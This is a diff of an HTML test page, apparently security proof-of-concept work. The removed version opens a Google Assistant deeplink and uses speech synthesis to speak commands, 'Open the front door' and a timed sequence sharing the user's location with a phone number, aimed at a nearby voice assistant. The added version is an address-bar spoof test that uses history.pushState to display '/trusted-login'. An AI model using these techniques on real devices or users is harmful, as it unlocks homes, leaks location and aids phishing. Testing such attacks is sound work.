@@ -1,40 +1,90 @@
-<h1>
-    <a onclick="opendoor()" href="googleapp://deeplink/?data=CkwBDb3mGzBFAiEAic8-0un3nRrMa_hkMUV9fj_zD09xhu9D6xTXEsFSRPICIEJlWlJRSqv3afrbX9J8BZa_h3sAfF8NSDFAlLSj10MUEjkKAggAEgIIbxoQEg4IBBIK6oqo9AQECAFAACIdChtodHRwOi8vYXNzaXN0YW50Lmdvb2dsZS5jb20">
-        open front door
-    </a>
-</h1>
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Address Bar Spoof Test</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {
+  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+  padding: 20px;
+}
+
+.box {
+  background:#f5f5f7;
+  padding:20px;
+  border-radius:12px;
+}
+
+button {
+  padding:12px;
+  border:0;
+  border-radius:10px;
+  background:#007aff;
+  color:white;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+
+<h2>Address Bar Test</h2>
+
+<p id="url"></p>
+<p id="origin"></p>
+
+<button onclick="changePath()">
+Change Visible Path
+</button>
+
+<button onclick="navigate()">
+Navigate
+</button>
+
+</div>
+
 
 <script>
-function speak(text) {
-    const speech = new SpeechSynthesisUtterance(text);
 
-    speech.lang = "en-US";
-    speech.rate = 1;
-    speech.pitch = 1;
-    speech.volume = 1;
+function update(){
 
-    window.speechSynthesis.speak(speech);
+document.getElementById("url").textContent =
+"location.href: " + location.href;
+
+document.getElementById("origin").textContent =
+"origin: " + location.origin;
+
 }
 
-function share() {
-    setTimeout(() => {
-        speak("Share my location with");
 
-        setTimeout(() => {
-            speak("zero eight one two three four five six seven eight nine");
+function changePath(){
 
-            setTimeout(() => {
-                speak("Send it");
-            }, 12000);
+history.pushState(
+{},
+"",
+"/trusted-login"
+);
 
-        }, 6000);
+update();
 
-    }, 500);
 }
 
-function opendoor() {
-    setTimeout(() => {
-        speak("Open the front door");
-    }, 500);
+
+function navigate(){
+
+location.href =
+"https://example.com";
+
 }
+
+
+update();
+
+window.onpopstate = update;
+
 </script>
+
+</body>
+</html>
